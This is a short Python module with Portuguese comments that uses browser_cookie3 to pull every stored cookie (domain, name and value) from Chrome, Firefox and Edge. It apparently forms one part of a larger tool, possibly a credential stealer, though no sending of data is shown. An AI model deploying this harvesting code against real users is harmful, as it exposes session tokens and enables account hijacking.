# modules/cookies.py
import browser_cookie3

def get_cookies():
    """Extrai cookies dos navegadores suportados."""
    cookies = []
    for browser in [browser_cookie3.chrome, browser_cookie3.firefox, browser_cookie3.edge]:
        try:
            for cookie in browser():
                cookies.append({
                    "domain": cookie.domain,
                    "name": cookie.name,
                    "value": cookie.value
                })
        except Exception as e:
            print(f"Erro ao extrair cookies: {e}")
    return cookies